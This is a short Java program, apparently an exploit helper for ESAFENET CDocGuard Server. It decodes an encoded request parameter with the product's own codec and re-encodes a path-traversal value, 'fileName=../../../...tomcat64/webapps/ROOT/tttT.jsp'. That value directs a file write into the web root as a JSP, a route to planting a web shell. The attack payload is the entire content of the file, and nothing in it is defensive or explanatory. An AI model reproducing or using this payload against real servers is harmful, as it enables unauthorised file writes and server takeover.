public class Main {
    public static void main(String[] args) {
        String value_code = "AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM";
//        String value_code="AFCOCOCOEOENCODJCOFHBACOEPCOCOFJBMCOCOFNCOCOCOCOCOCODDCOCOCOCOGAFAFJCOEJPHEPCODGPBCOCOFICOGFCOEOEFBKCDDCGJEPCOFHCOAOCOCOPNCOCOAFDNCGBAEECOFFCOBJPDPIEECOBOECDMDLEPBJGBGCGLEMBDFAGOGM";
        String value_decode = "";
        String value_encode="";
        String vds[] = null;
        value_code = value_code.substring(value_code.indexOf("=") + 1);
        try
        {
            value_decode = CDGUtil.decode(value_code);
            // decode: fileName=../../../Program Files (x86)/ESAFENET/CDocGuard Server/tomcat64/webapps/ROOT/tttT.jsp
            System.out.println(value_decode);
            // encode value again
            value_encode = CDGUtil.encode("fileName=../../../Program Files (x86)/ESAFENET/CDocGuard Server/tomcat64/webapps/ROOT/tttT.jsp");
            System.out.println(value_encode);


        }
        catch(Exception e)
        {
            e.printStackTrace();
        }
    }
}